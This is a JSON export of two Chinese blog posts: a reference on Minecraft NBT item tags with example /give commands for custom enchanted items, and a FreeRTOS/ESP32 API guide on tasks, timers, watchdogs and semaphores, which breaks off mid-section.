[{"content":"偶然看到电脑里存的一份记录着Minecraft NBT用法的文本文档，干脆拿过来当文章了（恼\n都有些啥？ 在一个大的json里套了一堆东西，如果写TypeScript表示那更好，但可惜不想写（懒\n大部分都是从minecraft fandom找的\n附魔 Enchantments 1 2 3 4 5 6 { Enchantments:[ {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级}, {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级} ] } 类型: List\n字段定义:\n字段名 类型 意义 id String 魔咒的id lvl uint8_t（雾） 魔咒的等级 名称显示 display 1 2 3 4 5 6 7 { display:{ Name:\u0026#34;物品名称的JSON文本\u0026#34;, color:\u0026#34;颜色代码\u0026#34;, Lore:[\u0026#34;第一行\u0026#34;,\u0026#34;第二行\u0026#34;] } } 类型: Object\n字段定义:\n字段名 类型 意义 Name String 物品名称的JSON文本 Color String with int 颜色代码 Lore List of String 物品描述 属性 AttributeModifiers 1 2 3 4 5 6 { AttributeModifiers:[ {AttributeName:\u0026#34;#\u0026#34;,Name:\u0026#34;#\u0026#34;,Amount:#,Operation:#,UUID:[I;#,#,#,#],Slot:#}, {AttributeName:\u0026#34;#\u0026#34;,Name:\u0026#34;#\u0026#34;,Amount:#,Operation:#,UUID:[I;#,#,#,#],Slot:#} ] } 类型: List\n字段定义:\n字段名 类型 意义 AttributeName String 决定属性修饰符所应用的属性。 Name String 属性修饰符的名称，用于内部的区分和识别。 Amount int 决定属性修饰符的数值。 Operation int 决定属性修饰符的运算模式。0为增加（X+Amount），1为按基加倍（X*(1+Amount)），2为加倍（X*(1+Amount)）。1和2的区别是，当存在多个Amount时，1会按照X*(1+Amount1+Amount2)的形式运算，而2会按照X*(1+Amount1)*(1+Amount2)的形式运算。 UUID list object 属性修饰符的UUID，用于区分不同的属性修饰符。对于所有增加属性的装备而言，相同UUID取最高 Slot int or String 决定物品处在什么槽位时，属性修饰符才会生效。如果没有定义此项，属性修饰符将对所有槽位生效。 不可破坏 Unbreakable 1 {Unbreakable:1b} 类型: Bool\n0或者1，b写不写貌似无所谓\n附魔书 StoredEnchantments 1 2 3 4 5 6 { StoredEnchantments:[ {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级}, {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级} ] } 类型: List\n字段定义:\n字段名 类型 意义 id String 魔咒的id lvl uint8_t（雾） 魔咒的等级 再详细说说 关于魔咒 魔咒名称 魔咒id 水下速掘 aqua_affinity 节肢杀手 bane_of_arthropods 爆炸保护 blast_protection 引雷 channeling 绑定诅咒 binding_curse 消失诅咒 vanishing_curse 深海探索者 depth_strider 效率 efficiency 摔落保护 feather_falling 火焰附加 fire_aspect 火焰保护 fire_protection 火矢 flame 时运 fortune 冰霜行者 frost_walker 穿刺 impaling 无限 infinity 击退 knockback 抢夺 looting 忠诚 loyalty 海之眷顾 luck_of_the_sea 饵钓 lure 经验修补 mending 多重射击 multishot 穿透 piercing 力量 power 弹射物保护 projectile_protection 保护 protection 冲击 punch 快速装填 quick_charge 水下呼吸 respiration 激流 riptide 锋利 sharpness 精准采集 silk_touch 亡灵杀手 smite 灵魂疾行 soul_speed 迅捷潜行 swift_sneak 横扫之刃 sweeping 荆棘 thorns 耐久 unbreaking 关于属性 属性名称 效果 generic.max_health 这个生物的最大生命值；亦或这个生物通过生命恢复最多可以恢复至的极限。你需要运用[Health:#]nbt改变生物的当前生命值 generic.follow_range 这个生物追踪玩家或者其他生物的最大范围，以方块数为单位。目标离开这个区域意味着它们将停止追踪。目前大多数生物这个值为16，而僵尸则有40 generic.movement_speed 移动速度 generic.knockback_resistance 这个生物的抗击退效果（包括攻击的击退、爆炸和弹射物冲击）的程度，1.0代表完全抵抗 generic.attack_damage 普通攻击造成的伤害，一点表示半个心形标志。此属性在友好生物中未找到 generic.attack_knockback 这个生物的攻击击退力度，列表之外的生物中不具备该属性 generic.armor 盔甲的防御点数 generic.armor_toughness 盔甲韧性 generic.attack_speed 决定攻击力度的填充速度，值代表每秒可以进行全力攻击的次数 generic.luck 影响战利品表使用的quality和bonus_rolls（例如当打开箱子、运输矿车，钓鱼和杀怪） 关于槽位 可以写成数字形式，也可以写成字符串的形式，不同的写法也有可能导致相同的结果。\n槽位名 对应位置 mainhand 拿在主手 offhand 拿在副手 head 装备在头部 chest 装备在胸甲部位 legs 装备在腿部 feet 装备在脚上 举个栗子 以下指令均须在命令方块里执行\n/give @p minecraft:Command_Block\n迅捷步伐 具有高额击退，拿着的时候提供速度加成。\n1 /give @p minecraft:feather{display:{Name:\u0026#39;[\u0026#34;迅捷步伐\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;knockback\u0026#34;,lvl:16}],AttributeModifiers:[{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.armor_toughness\u0026#34;,Amount:2,Operation:1,UUID:[I;1,1,1,9],Slot:\u0026#34;mainhand\u0026#34;}]} 嗜杀癫狂 纯粹的高伤害，其实里面有附魔没生效。\n1 /give @p minecraft:stick{display:{Name:\u0026#39;[\u0026#34;嗜杀癫狂\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;sharpness\u0026#34;,lvl:255},{id:\u0026#34;bane_of_arthropods\u0026#34;,lvl:255},{id:\u0026#34;smite\u0026#34;,lvl:255}],AttributeModifiers:[{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.armor_toughness\u0026#34;,Amount:0.2,Operation:1,UUID:[I;1,1,1,9],Slot:\u0026#34;mainhand\u0026#34;}]} 巧取豪夺 中等伤害，较高等级的抢夺。\n1 /give @p minecraft:bone{display:{Name:\u0026#39;[\u0026#34;巧取豪夺\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;sharpness\u0026#34;,lvl:4},{id:\u0026#34;looting\u0026#34;,lvl:32},{id:\u0026#34;silk_touch\u0026#34;,lvl:1}],AttributeModifiers:[{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.armor_toughness\u0026#34;,Amount:0.1,Operation:1,UUID:[I;1,1,1,9],Slot:\u0026#34;mainhand\u0026#34;}]} 燃尽薪焱 低伤害，但是会附着火焰。差不多刚好暴击一头牛\n1 /give @p minecraft:blaze_rod{display:{Name:\u0026#39;[\u0026#34;燃尽薪焱\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;sharpness\u0026#34;,lvl:16},{id:\u0026#34;fire_aspect\u0026#34;,lvl:255}],AttributeModifiers:[{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.armor_toughness\u0026#34;,Amount:0.1,Operation:1,UUID:[I;1,1,1,9],Slot:\u0026#34;mainhand\u0026#34;}]} 坚强立场 拿着的时候减速，但是提供高额护甲和盔甲韧性，难以被击退，惧怕魔法伤害和破防\n1 /give @p minecraft:nautilus_shell{display:{Name:\u0026#39;[\u0026#34;坚强立场\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;protection\u0026#34;,lvl:5}],AttributeModifiers:[{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.movement_speed\u0026#34;,Amount:-0.8,Operation:1,UUID:[I;1,1,114,9],Slot:\u0026#34;mainhand\u0026#34;},{AttributeName:\u0026#34;generic.knockback_resistance\u0026#34;,Name:\u0026#34;generic.knockback_resistance\u0026#34;,Amount:2,Operation:0,UUID:[I;1,1,114,8],Slot:\u0026#34;mainhand\u0026#34;},{AttributeName:\u0026#34;generic.armor_toughness\u0026#34;,Name:\u0026#34;generic.armor_toughness\u0026#34;,Amount:255,Operation:0,UUID:[I;1,1,114,7],Slot:\u0026#34;mainhand\u0026#34;},{AttributeName:\u0026#34;generic.armor\u0026#34;,Name:\u0026#34;generic.armor\u0026#34;,Amount:255,Operation:0,UUID:[I;1,1,114,6],Slot:\u0026#34;mainhand\u0026#34;}]} 两本附魔书 魔咒等级太高而且冲突会导致附魔书失去作用\n所有的保护\n1 /give @p minecraft:enchanted_book{StoredEnchantments:[{id:\u0026#34;blast_protection\u0026#34;,lvl:5},{id:\u0026#34;feather_falling\u0026#34;,lvl:5},{id:\u0026#34;fire_protection\u0026#34;,lvl:5},{id:\u0026#34;projectile_protection\u0026#34;,lvl:5},{id:\u0026#34;protection\u0026#34;,lvl:5},{id:\u0026#34;unbreaking\u0026#34;,lvl:3},{id:\u0026#34;depth_strider\u0026#34;,lvl:3},{id:\u0026#34;respiration\u0026#34;,lvl:3},{id:\u0026#34;thorns\u0026#34;,lvl:4},{id:\u0026#34;soul_speed\u0026#34;,lvl:4}]} 所有的伤害\n1 /give @p minecraft:enchanted_book{StoredEnchantments:[{id:\u0026#34;looting\u0026#34;,lvl:3},{id:\u0026#34;sharpness\u0026#34;,lvl:255},{id:\u0026#34;bane_of_arthropods\u0026#34;,lvl:255},{id:\u0026#34;smite\u0026#34;,lvl:255},{id:\u0026#34;fire_aspect\u0026#34;,lvl:1}]} 一些盔甲 1 /give @p minecraft:chainmail_boots{display:{Name:\u0026#39;[\u0026#34;天使的足履\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;blast_protection\u0026#34;,lvl:5},{id:\u0026#34;binding_curse\u0026#34;,lvl:1},{id:\u0026#34;depth_strider\u0026#34;,lvl:3},{id:\u0026#34;feather_falling\u0026#34;,lvl:255},{id:\u0026#34;fire_protection\u0026#34;,lvl:2},{id:\u0026#34;mending\u0026#34;,lvl:2},{id:\u0026#34;projectile_protection\u0026#34;,lvl:3},{id:\u0026#34;protection\u0026#34;,lvl:5},{id:\u0026#34;respiration\u0026#34;,lvl:4},{id:\u0026#34;swift_sneak\u0026#34;,lvl:5},{id:\u0026#34;soul_speed\u0026#34;,lvl:3},{id:\u0026#34;thorns\u0026#34;,lvl:5},{id:\u0026#34;unbreaking\u0026#34;,lvl:3}],Unbreakable:1b,AttributeModifiers:[{AttributeName:\u0026#34;generic.max_health\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:10,Operation:0,UUID:[I;1,1,3,1],Slot:\u0026#34;feet\u0026#34;},{AttributeName:\u0026#34;generic.max_health\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.1,Operation:1,UUID:[I;1,1,3,2],Slot:\u0026#34;feet\u0026#34;},{AttributeName:\u0026#34;generic.knockback_resistance\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.2,Operation:1,UUID:[I;1,1,3,3],Slot:\u0026#34;feet\u0026#34;},{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.4,Operation:1,UUID:[I;1,1,3,5],Slot:\u0026#34;feet\u0026#34;},{AttributeName:\u0026#34;generic.attack_speed\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:514,Operation:0,UUID:[I;1,1,3,7],Slot:\u0026#34;feet\u0026#34;},{AttributeName:\u0026#34;generic.armor\u0026#34;,Operation:0,Amount:10d,Slot:\u0026#34;feet\u0026#34;,Name:\u0026#34;Armor\u0026#34;,UUID:[I;1,1,3,4]}]} 1 /give @p minecraft:elytra{display:{Name:\u0026#39;[\u0026#34;天使的羽翼\u0026#34;]\u0026#39;},Enchantments:[{id:\u0026#34;blast_protection\u0026#34;,lvl:5},{id:\u0026#34;binding_curse\u0026#34;,lvl:1},{id:\u0026#34;depth_strider\u0026#34;,lvl:3},{id:\u0026#34;feather_falling\u0026#34;,lvl:255},{id:\u0026#34;fire_protection\u0026#34;,lvl:2},{id:\u0026#34;mending\u0026#34;,lvl:2},{id:\u0026#34;projectile_protection\u0026#34;,lvl:3},{id:\u0026#34;protection\u0026#34;,lvl:5},{id:\u0026#34;respiration\u0026#34;,lvl:4},{id:\u0026#34;swift_sneak\u0026#34;,lvl:5},{id:\u0026#34;soul_speed\u0026#34;,lvl:3},{id:\u0026#34;thorns\u0026#34;,lvl:5},{id:\u0026#34;unbreaking\u0026#34;,lvl:3}],Unbreakable:1b,AttributeModifiers:[{AttributeName:\u0026#34;generic.max_health\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:10,Operation:0,UUID:[I;1,1,2,1],Slot:\u0026#34;chest\u0026#34;},{AttributeName:\u0026#34;generic.max_health\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.1,Operation:1,UUID:[I;1,1,2,2],Slot:\u0026#34;chest\u0026#34;},{AttributeName:\u0026#34;generic.knockback_resistance\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.2,Operation:1,UUID:[I;1,1,2,3],Slot:\u0026#34;chest\u0026#34;},{AttributeName:\u0026#34;generic.movement_speed\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:0.4,Operation:1,UUID:[I;1,1,2,5],Slot:\u0026#34;chest\u0026#34;},{AttributeName:\u0026#34;generic.attack_speed\u0026#34;,Name:\u0026#34;generic.max_health\u0026#34;,Amount:514,Operation:0,UUID:[I;1,1,2,7],Slot:\u0026#34;chest\u0026#34;},{AttributeName:\u0026#34;generic.armor\u0026#34;,Operation:0,Amount:10d,Slot:\u0026#34;chest\u0026#34;,Name:\u0026#34;Armor\u0026#34;,UUID:[I;1,1,2,4]}]} ","permalink":"https://www.papernote.cn/posts/2022-07-25-%E5%85%B3%E4%BA%8Eminecraft-nbt%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/","summary":"偶然看到电脑里存的一份记录着Minecraft NBT用法的文本文档，干脆拿过来当文章了（恼\n都有些啥？ 在一个大的json里套了一堆东西，如果写TypeScript表示那更好，但可惜不想写（懒\n大部分都是从minecraft fandom找的\n附魔 Enchantments 1 2 3 4 5 6 { Enchantments:[ {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级}, {id:\u0026#34;魔咒ID\u0026#34;,lvl:#魔咒等级} ] } 类型: List\n字段定义:\n字段名 类型 意义 id String 魔咒的id lvl uint8_t（雾） 魔咒的等级 名称显示 display 1 2 3 4 5 6 7 { display:{ Name:\u0026#34;物品名称的JSON文本\u0026#34;, color:\u0026#34;颜色代码\u0026#34;, Lore:[\u0026#34;第一行\u0026#34;,\u0026#34;第二行\u0026#34;] } } 类型: Object\n字段定义:\n字段名 类型 意义 Name String 物品名称的JSON文本 Color String with int 颜色代码 Lore List of String 物品描述 属性 AttributeModifiers 1 2 3 4 5 6 { AttributeModifiers:[ {AttributeName:\u0026#34;#\u0026#34;,Name:\u0026#34;#\u0026#34;,Amount:#,Operation:#,UUID:[I;#,#,#,#],Slot:#}, {AttributeName:\u0026#34;#\u0026#34;,Name:\u0026#34;#\u0026#34;,Amount:#,Operation:#,UUID:[I;#,#,#,#],Slot:#} ] } 类型: List","title":"关于Minecraft NBT的一些记录"},{"content":" ❗ 注意\n文章内容较长且多为字典用途，请结合上面的目录使用。\nAyala看b站UP主孤独的二进制的FreeRTOS教学视频有感，打算对视频内容进行一些总结和归纳，方便以后的使用，遂有此篇。\n为什么要使用RTOS （Real-Time Operating System,RTOS）即实时操作系统，通常应用于嵌入式等对实时性要求较高的产品中，它会按照排序运行、管理系统资源，并为开发应用程序提供一致的基础。 实时操作系统与一般的操作系统相比，最大的特色就是“实时性”，如果有一个任务需要执行，实时操作系统会马上（在较短时间内）执行该任务，不会有较长的延时。这种特性保证了各个任务的及时执行。\nFreeRTOS与Arduino框架的区别 在ESP32平台上，Arduino是运行在RTOS上的一个任务（Task），分为设置代码setup()和基础循环loop()，其在RTOS中的表示大概是这样的：\n1 2 3 4 5 6 7 8 9 10 11 void task_arduino(void* ptParam) { setup() for (;;) { loop() } } void app_main() { xTaskCreatePinnedToCore(task_arduino,\u0026#34;arduino\u0026#34;,1024*128,NULL,1,NULL,1) // 以上一条代码不需要管 } 而一个标准的Arduino的程序看起来是这样的：\n1 2 3 4 5 6 void setup() { ... } void loop() { ... } 使用Arduino-ESP32这个库会将上述代码代入前一个代码，所以即便你可能用的是ArduinoIDE，但是实际上仍会被翻译成ESP-IDF项目，所以你可以在你的Arduino-ESP32项目中使用FreeRTOS。\nFreeRTOS有什么API需要注意 💬 引用：\nb站 孤独的二进制：有相当部分的内容来自于此\nESP32文档和FreeRTOS的文档翻译：函数原型、参数、返回值等的描述\n可能还有一些没标注到的，请在评论区联系我。\n创建、删除任务，任务绑定核心 xTaskCreate 创建任务\n1 2 3 4 5 6 7 8 BaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName, configSTACK_DEPTH_TYPE usStackDepth, void *pvParameters, UBaseType_t uxPriority, TaskHandle_t *pxCreatedTask ); 参数 功能 注意点 pvTaskCode 任务函数 传入一个函数指针，函数需要一个空类型指针作为参数 pcName 任务名 传入一个字符串 usStackDepth 任务栈大小 即内存空间，一般的写法为1024*n（n为任务需求的内存大小） pvParameters 任务参数 使用空类型指针，可以传结构体指针，只要前面加上(void *)进行强制类型转换，但是在任务内部仍需转换回来 uxPriority 任务优先级 一般是0-24，24为最高优先级，如果高优先级任务不block或者暂停，那么低优先级任务永不执行 pxCreatedTask 任务句柄 用于控制这个任务，比如删除、暂停、设置优先级等 返回值 意义 pdPass 表示任务已经创建成功 errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY 表示无法创建任务，因为FreeRTOS没有足够的堆内存来分配任务数据结构和堆栈 xTaskCreatePinnedToCore 在指定核心上创建任务。\n当核心不存在时将会在核心0上创建任务。\n1 2 3 4 5 6 7 8 9 BaseType_t xTaskCreatePinnedToCore( TaskFunction_t pvTaskCode, const char * const pcName, configSTACK_DEPTH_TYPE usStackDepth, void *pvParameters, UBaseType_t uxPriority, TaskHandle_t *pxCreatedTask, const BaseType_t xCoreID ); 前七个参数等同于前面的xTaskCreate，而最后一个参数指定核心，返回值也等同于前面的xTaskCreate。\nvTaskDelete 删除任务\n1 2 void vTaskDelete( TaskHandle_t pxTaskToDelete ); void vTaskDelete( NULL ); 当传入指定任务的句柄，将会删除这个任务。当传入NULL，则会删除当前任务。\n当对一个已经删除的任务执行vTaskDelete将会导致系统重启。\n任务阻塞（延时）、挂起及从挂起的恢复 vTaskDelay 相对延时（阻塞）\n1 void vTaskDelay( TickType_t xTicksToDelay ); FreeRTOS的“delay”是基于tick的，有时候1tick并不等于1ms，所以存在常量portTICK_PERIOD_MS，这个常量的意义是每毫秒的tick数，在ESP32平台上这个常量默认为1。\n当我们需要延时5秒，我们可用写成 vTaskDelay(5000/portTICK_PERIOD_MS);\nvTaskDelayUntil 绝对延时（阻塞）\n控制任务能够周期性运行\n1 2 3 4 void vTaskDelayUntil( TickType_t *pxPreviousWakeTime, TickType_t xTimeIncrement ); 参数 功能 *pxPreviousWakeTime 指定一个变量来掌握任务最后开启的时间, 第一次使用时必须使用当前时间来初始化, 在vTaskDelayUntil中，这个变量是自动修改的 xTimeIncrement 循环周期时间 举个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 任务将会每10ticks运行一次。 void vTaskFunction( void * pvParameters ) { TickType_t xLastWakeTime; const TickType_t xFrequency = 10; // 用当前时间初始化 xLastWakeTime 变量。 xLastWakeTime = xTaskGetTickCount(); // 这个函数会返回当前总共从开机经过的tick数 for( ;; ) { // 等待下一次循环. vTaskDelayUntil( \u0026amp;xLastWakeTime, xFrequency ); // 代码.... } } vTaskSuspend 挂起一个任务\n1 void vTaskSuspend( TaskHandle_t xTaskToSuspend ); xTaskToSuspend：欲挂起任务的句柄\nvTaskResume 恢复一个挂起的任务\n1 void vTaskResume( TaskHandle_t xTaskToResume ); xTaskToResume：欲恢复任务的句柄\nvTaskSuspendAll 挂起所有任务\n1 void vTaskSuspendAll(); xTaskResumeAll 恢复所有任务\n1 BaseType_t xTaskResumeAll(); 任务优先级 uxTaskPriorityGet 获取任务优先级\n1 2 UBaseType_t uxTaskPriorityGet( TaskHandle_t xTask ); UBaseType_t uxTaskPriorityGet(NULL); 当传入指定任务的句柄时，将会返回那个任务的优先级。而传入NULL时，将会返回当前任务的优先级。\nvTaskPrioritySet 设置任务优先级\n1 2 3 4 void vTaskPrioritySet( TaskHandle_t xTask, UBaseType_t uxNewPriority ); taskYIELD yield 退让资源，任务调度器会重新评估任务，将资源分配给同等级或者更高等级任务\n1 2 taskYIELD(); yield(); 任务内存 ESP32获取总的Heap占用 1 2 ESP.getHeapSize() //本程序Heap最大尺寸 ESP.getFreeHeap() //当前Free Heap最大尺寸 返回一个类似uint32_t类型的值，单位是Byte。\nuxTaskGetStackHighWaterMark 检查任务从创建好到现在的历史剩余内存的最小值，记作“高水位线”。\n1 2 UBaseType_t uxTaskGetStackHighWaterMark( TaskHandle_t xTask ); UBaseType_t uxTaskGetStackHighWaterMark( NULL ); 当传入指定任务的句柄时，将会返回那个任务的“高水位线”。而传入NULL时，将会返回当前任务的“高水位线”。\n返回一个类似uint32_t类型的值，单位是Byte。\nSoftware Timer - 软件定时器 作为实时操作系统的FreeRTOS给我们提供了一个软件实现的定时器。很多朋友，也许没有使用过Timer。这主要是开发板上硬件Timer太少了，轮不到我们最终用户使用。 FreeRTOS给我们打来了新的大门，只要内存允许，想要多少个Timer 就有多少个Timer。\nxTimerCreate 创建一个软件定时器\n1 2 3 4 5 6 7 8 9 TimerHandle_t xTimerCreate( const char * const pcTimerName, const TickType_t xTimerPeriodInTicks, const UBaseType_t uxAutoReload, void * const pvTimerID, TimerCallbackFunction_t pxCallbackFunction ); void CallbackFunction(TimerHandle_t xTimer); // 回调函数的定义 参数 功能 pcTimerName 定时器名称（调试用） xTimerPeriodInTicks 周期（单位tick） uxAutoReload 自动装载（pdTURE） pvTimerID 定时器ID，可以判断是哪一个定时器 pxCallbackFunction 回调函数 返回定时器的句柄\nxTimerStart 启动一个软件定时器\n1 2 3 4 BaseType_t xTimerStart( TimerHandle_t xTimer, TickType_t xToclsToWait ); 参数 功能 xTimer 定时器句柄 xToclsToWait 阻塞等待时间 返回值 意义 pdPass 表示定时器已经创建成功 pdFAIL 表示定时器队列已满 xTimerReset 重启定时器\n1 2 3 4 BaseType_t xTimerReset( TimerHandle_t xTimer, TickType_t xToclsToWait ); 参数类型、返回值同 xTimerStart\n重启软件定时器 如果定时器已经启动，重新计算时间 如果没有启动，则启动 pvTimerGetTimerID 获取定时器ID\n1 void* pvTimerGetTimerID(TimerHandle_t xTimer); xTimerChangePeriod 更改定时器周期\n1 2 3 4 5 BaseType_t xTimerChangePeriod( TimerHandle_t xTimer, TickType_t xNewPeriod, TickType_t xToclsToWait ); 参数 功能 xTimer 定时器句柄 xNewPeriod 新的定时周期 xToclsToWait 阻塞等待时间 如果定时器没启动，会启动定时器\nWatchdog - 看门狗 （ESP平台独占） 看门狗，又叫 watchdog，从本质上来说就是一个定时器。将任务交给看门狗看管后，看门狗会不断的观察任务，如果任务不在指定时间内喂狗。那么，定时器到0，然后狗慌了，ESP32 就自动重启。\n看门狗针对于Task任务\nArduion-ESP32 默认在 Core 0 的 IDLE 任务开启了看门狗 时间为 5000 ticks = 5秒 Core 0 和 Core 1 都运行了 FreeRTOS的IDLE任务，优先级为 0 IDLE任务用于清理被删除任务的内存 Core 1 loopBack任务就是Arduino的 setup 和 loop ，优先级为 1 esp_task_wdt.h 在Arduino-ESP32平台上使用看门狗（WDT）需要额外引入一个库：\n1 #include \u0026#34;esp_task_wdt.h\u0026#34; esp_task_wdt_add 给任务添加看门狗\n1 esp_err_t esp_task_wdt_add(TaskHandle_t task_handle); 任务句柄为NULL时则代表本任务\nesp_task_wdt_delete 取消任务订阅的看门狗\n1 esp_err_t esp_task_wdt_delete(TaskHandle_t task_handle); 任务句柄为NULL时则代表本任务\nesp_task_wdt_reset 在任务中重置当前任务绑定看门狗的时间，简称喂狗。\n1 esp_err_t esp_task_wdt_reset(void); 如何重置所有的WDT 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026#34;soc/timer_group_struct.h\u0026#34; #include \u0026#34;soc/timer_group_reg.h\u0026#34; void feedTheDogInAllTasks() { //通过寄存器给所有任务的狗喂时 // feed dog 0 TIMERG0.wdt_wprotect = TIMG_WDT_WKEY_VALUE; // write enable TIMERG0.wdt_feed = 1; // feed dog TIMERG0.wdt_wprotect = 0; // write protect // feed dog 1 TIMERG1.wdt_wprotect = TIMG_WDT_WKEY_VALUE; // write enable TIMERG1.wdt_feed = 1; // feed dog TIMERG1.wdt_wprotect = 0; // write protect } 删除指定核心上的所有WDT 1 2 3 //手动关闭CPU上的TWDT - 慎重操作 disableCore0WDT(); disableCore1WDT(); Semaphore - 信号量 信号量通常用于任务间的同步和资源的保护。\n全局共享变量 当创建全局变量且要多线程访问时，我们应该使用volatile修饰符。\nvolatile关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其他线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。\n1 2 volatile int i=10; uint32_t j = 12; xSemaphoreCreateBinary 二进制信号量 二进制信号量，可以想成是一个布尔类型，只有0 和 1。\n1 SemaphoreHandle_t xSemaphoreCreateBinary( void ); 返回值为NULL表示信号量创建失败，否则返回信号量句柄。\n新创建的信号量处于无效状态，这意味着使用API函数xSemaphoreTake()获取信号之前，需要先给出信号。\n二进制信号量和互斥量非常相似，但也有细微的区别：互斥量具有优先级继承机制，二进制信号量没有这个机制。这使得二进制信号量更适合用于同步（任务之间或者任务和中断之间），互斥量更适合互锁。\n一旦获得二进制信号量后不需要恢复，一个任务或中断不断的产生信号，而另一个任务不断的取走这个信号，通过这样的方式来实现同步。\n低优先级任务拥有互斥量的时候，如果另一个高优先级任务也企图获取这个信号量，则低优先级任务的优先级会被临时提高，提高到和高优先级任务相同的优先级。这意味着互斥量必须要释放，否则高优先级任务将不能获取这个互斥量，并且那个拥有互斥量的低优先级任务也永远不会被剥夺，这就是操作系统中的优先级翻转。\n互斥量和二进制信号量都是SemaphoreHandle_t类型，并且可以用于任何具有这类参数的API函数中。\nxSemaphoreCreateCounting 计数信号量 从概念上来说，信号量是一个非负整数计数。 信号量通常用来协调对资源的访问，其中信号计数会初始化为可用资源的数目。 然后，线程在资源增加时会增加计数，在删除资源时会减小计数，这些操作都以原子方式执行。\n当计数信号量释放时，如果有任务阻塞在该信号量阻塞队列上，那么任务解除阻塞；但是如果信号量释放时，没有任务阻塞在该信号量阻塞队列上，那么计数器加一。\n1 2 3 SemaphoreHandle_t xSemaphoreCreateCounting ( UBaseType_t uxMaxCount, UBaseType_t uxInitialCount ) 参数 功能 uxMaxCount 最大计数值，当信号到达这个值后，就不再增长了 uxInitialCount 创建信号量时的初始值 返回值为NULL表示信号量创建失败，否则返回信号量句柄。\nxSemaphoreCreateMutex 互斥量 有多任务同时写入，或者数据大小超过cpu内存通道时，或者对共享资源的访问时候，需要有防范机制，使用MUTEX对数据对Cirtical Section的内容进行保护，可以想象成MUTEX就是一把锁，共享的资源被锁在了一个箱子里，只有一把钥匙，有钥匙的任务才能对改资源进行访问。\n1 SemaphoreHandle_t xSemaphoreCreateMutex( void ); 返回值为NULL表示信号量创建失败，否则返回信号量句柄。\n二进制信号量和互斥量非常相似，但也有细微的区别：互斥量具有优先级继承机制，二进制信号量没有这个机制。这使得二进制信号量更适合用于同步（任务之间或者任务和中断之间），互斥量更适合互锁。\n一旦获得二进制信号量后不需要恢复，一个任务或中断不断的产生信号，而另一个任务不断的取走这个信号，通过这样的方式来实现同步。\n低优先级任务拥有互斥量的时候，如果另一个高优先级任务也企图获取这个信号量，则低优先级任务的优先级会被临时提高，提高到和高优先级任务相同的优先级。这意味着互斥量必须要释放，否则高优先级任务将不能获取这个互斥量，并且那个拥有互斥量的低优先级任务也永远不会被剥夺，这就是操作系统中的优先级翻转。\nxSemaphoreCreateRecursiveMutex 递归互斥量 1 SemaphoreHandle_t xSemaphoreCreateRecursiveMutex( void ); 递归类型的互斥量可以被拥有者重复获取。拥有互斥量的任务必须调用API函数xSemaphoreGiveRecursive()将拥有的递归互斥量全部释放后，该信号量才真正被释放。比如，一个任务成功获取同一个互斥量5次，那么这个任务要将这个互斥量释放5次之后，其它任务才能获取到它。\n递归互斥量具有优先级继承机制，因此任务获得一次信号后必须在使用完后做一个释放操作。 互斥量类型信号不可以用在中断服务例程中。 xSemaphoreTake 获取信号量，,不可用于中断\n1 2 3 4 BaseType_t xSemaphoreTake( SemaphoreHandle_t xSemaphore, TickType_t xTicksToWait ); 参数 功能 xSemaphore 信号量句柄 xTickToWait 信号量无效时，任务最多等待的时间，单位是系统节拍周期个数 返回值 意义 pdTRUE 成功获取到信号量 pdFALSE 信号量获取失败 xSemaphoreGive 释放信号量，不可用于中断\n1 BaseType_t xSemaphoreGive(SemaphoreHandle_t xSemaphore) 参数 功能 xSemaphore 信号量句柄 返回值 意义 pdTRUE 成功释放信号量 pdFALSE 信号量释放失败 xSemaphoreTakeFromISR 在中断中获取信号量\n1 2 3 4 BaseType_t xSemaphoreTakeFromISR( SemaphoreHandle_t xSemaphore, signedBaseType_t *pxHigherPriorityTaskWoken ); 参数 功能 xSemaphore 信号量句柄 *pxHigherPriorityTaskWoken 一般设置为NULL 返回值 意义 pdTRUE 成功获取到信号量 pdFALSE 信号量获取失败 xSemaphoreGiveFromISR 在中断中释放信号量\n1 2 3 4 BaseType_t xSemaphoreGiveFromISR( SemaphoreHandle_t xSemaphore, signed BaseType_t *pxHigherPriorityTaskWoken ); 参数 功能 xSemaphore 信号量句柄 *pxHigherPriorityTaskWoken 一般设置为NULL 返回值 意义 pdTRUE 成功释放信号量 pdFALSE 信号量释放失败 xSemaphoreTakeRecursive 获取递归互斥量\n1 2 3 4 BaseType_t xSemaphoreTakeRecursive( SemaphoreHandle_t xMutex, TickType_t xTicksToWait ); 参数 功能 xMutex 